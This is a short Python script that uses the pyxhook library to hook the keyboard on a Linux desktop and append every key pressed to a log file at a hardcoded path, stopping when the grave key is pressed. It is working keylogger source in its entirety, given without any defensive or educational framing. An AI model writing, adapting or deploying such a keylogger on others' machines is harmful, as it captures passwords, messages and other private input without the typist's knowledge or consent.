import pyxhook

#change this to your log file's path
logs='/home/username/Desktop/asd.log'


def OnKeyPress(event):
  f=open(logs,'a')
  f.write(event.Key)
  f.write('\n')

  if event.Ascii==96: #96 is the ascii value of the grave key (`)
    f.close()
    new_hook.cancel()

new_hook=pyxhook.HookManager()
new_hook.KeyDown=OnKeyPress
new_hook.HookKeyboard()
new_hook.start()